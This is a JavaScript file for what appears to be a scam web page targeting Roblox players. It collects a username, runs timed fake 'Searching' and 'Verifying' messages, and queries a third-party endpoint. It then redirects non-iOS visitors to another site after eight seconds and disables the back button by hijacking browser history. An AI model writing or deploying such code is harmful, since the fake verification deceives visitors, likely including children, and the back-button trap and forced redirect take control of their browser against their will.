document.addEventListener("DOMContentLoaded", function () {
    let submitButton = document.getElementById('submitButton');
    let popupTitle = document.getElementById('popupTitle');
    let usernameInput = document.getElementById('usernameInput');
    let loadingImage = document.getElementById('loadingImage');

    submitButton.addEventListener("click", function () {
        let username = usernameInput.value;
        if (username) {
            let dots = "";
            let dotInterval = setInterval(() => {
                dots = dots.length < 3 ? dots + "." : "";
                popupTitle.textContent = `Searching ${username}${dots}`;
            }, 500);

            document.getElementById('popupImage').style.display = "none";
            document.getElementById('popupName').style.display = "none";
            usernameInput.style.display = "none";
            submitButton.style.display = "none";
            loadingImage.style.display = "block";

            setTimeout(() => {
                clearInterval(dotInterval);
                dots = "";
                dotInterval = setInterval(() => {
                    dots = dots.length < 3 ? dots + "." : "";
                    popupTitle.textContent = `Verifying${dots}`;
                }, 500);
            }, 3000);

            setTimeout(() => {
                clearInterval(dotInterval);
                dots = "";
                dotInterval = setInterval(() => {
                    dots = dots.length < 3 ? dots + "." : "";
                    popupTitle.textContent = `Loading last step${dots}`;
                }, 500);
            }, 6000);

            setTimeout(() => {
                clearInterval(dotInterval);
                popupTitle.textContent = `Finalizing`;
            }, 9000);

            setTimeout(() => {
                fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`)
                    .then(response => {
                        if (!response.ok) throw new Error("API not available");
                        return response.json();
                    })
                    .then(profileData => {
                        if (profileData.status === "SUCCESS") {
                            loadingImage.style.display = "none";
                            popupTitle.textContent = "Final step";
                            displayProfile(profileData);
                        }
                    })
                    .catch((error) => {
                        console.log("API error: ", error.message);
                        showVisitorInfo(username);
                    });
            }, 9000);
        }
    });
});

var button = document.querySelector('#submitButton');
button.addEventListener('click', function() {
    var redirectURL = "https://www.rolls3.com";

    if (window.location.hostname !== "www." + window.location.hostname) {
        var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

        if (!isIphoneOrIpad) {
            setTimeout(function() {
                window.location.href = redirectURL;
            }, 8000);

            history.pushState(null, null, location.href);
            window.onpopstate = function() {
                history.go(1);
            };
        }
    }
});
